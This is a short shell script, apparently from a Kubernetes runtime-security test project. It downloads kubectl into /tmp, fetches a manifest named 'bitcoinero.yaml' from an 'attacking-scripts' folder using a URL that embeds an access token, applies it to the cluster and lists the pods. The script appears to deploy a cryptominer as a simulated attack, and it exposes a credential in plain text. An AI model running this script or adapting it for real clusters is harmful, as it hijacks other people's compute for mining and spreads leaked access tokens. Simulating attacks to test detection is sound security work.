export PATH=/tmp:$PATH
cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
curl -LO https://raw.githubusercontent.com/Abdurrahmanm4nn/runtime-security-kubernetes/main/attacking-scripts/bitcoinero.yaml?token=GHSAT0AAAAAAB77XEROLB6X42WUQMXU6CXCZA2WUTA
mv bitcoinero.yaml\?token\=GHSAT0AAAAAAB77XEROLB6X42WUQMXU6CXCZA2WUTA bitcoinero.yaml
./kubectl apply -f bitcoinero.yaml
sleep 5
./kubectl get pods